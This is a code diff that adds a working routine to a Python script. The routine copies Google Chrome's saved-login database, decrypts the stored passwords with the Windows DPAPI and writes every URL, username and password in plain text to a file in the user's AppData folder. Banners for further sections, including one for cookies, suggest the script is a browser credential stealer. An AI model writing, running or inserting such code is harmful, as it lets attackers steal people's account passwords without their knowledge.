@@ -45,7 +45,23 @@ file.close()
 #                              GOOGLE PASSWORDS                                #
 ################################################################################
 def Chrome(): 
-   pass
+   text = 'Passwords Chrome:' + '\n' 
+   text += 'URL | LOGIN | PASSWORD' + '\n' 
+   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'): 
+       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
+       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2') 
+       cursor = conn.cursor()
+       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+       for result in cursor.fetchall():
+           password = win32crypt.CryptUnprotectData(result[2])[1].decode() 
+           login = result[1]
+           url = result[0]
+           if password != '':
+               text += url + ' | ' + login + ' | ' + password + '\n' 
+   return text
+file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")
+file.write(str(Chrome()) + '\n')
+file.close()
 ################################################################################
 #                              GOOGLE Cookies                                  #
 ################################################################################
